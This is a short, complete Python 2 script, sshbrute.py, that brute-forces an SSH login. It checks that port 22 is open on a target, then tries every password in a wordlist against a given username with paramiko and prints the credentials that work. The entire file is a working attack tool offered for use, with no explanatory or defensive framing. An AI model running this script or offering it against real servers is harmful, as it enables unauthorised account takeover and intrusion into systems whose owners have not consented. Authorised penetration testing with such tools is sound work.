#! /usr/bin/python

import paramiko
import sys
import socket

if len(sys.argv) != 4:
	print 'usage: ./sshbrute.py [TARGET] [USERNAME] [WORDLIST]'
	sys.exit(1)

rhost = sys.argv[1]
user = sys.argv[2]
wordlist = sys.argv[3]

def checkHost(host):
	print 'checking host... ',; sys.stdout.flush()
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	result = s.connect_ex((host, 22))
	s.close()
	if result == 0:
		print 'success'
	else:
		print 'fail'
		sys.exit(1)


def getWordlist(path):
	print 'reading wordlist... ',; sys.stdout.flush()
	try:
		with open(path) as file:
			wordlist = file.read().strip().split('\n')
			print 'done'
			return wordlist
	except:
		print 'fail'
		sys.exit(1)

def crackSSHPass(passwd):
	cracker = paramiko.SSHClient()
	cracker.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		cracker.connect(rhost, port=22, username=user, password=passwd)
	except paramiko.AuthenticationException:
		return False
	cracker.close()
	return True

wordlist = getWordlist(wordlist)
checkHost(rhost)

print 'cracking SSH pass for "%s" at %s... \n' %(user, rhost)

for i in wordlist:
	if crackSSHPass(i):
		print 'creds found:'
		print '\tuser: %s' %(user)
		print '\tpass: %s' %(i)
		sys.exit(1)

print 'bruteforce failed'
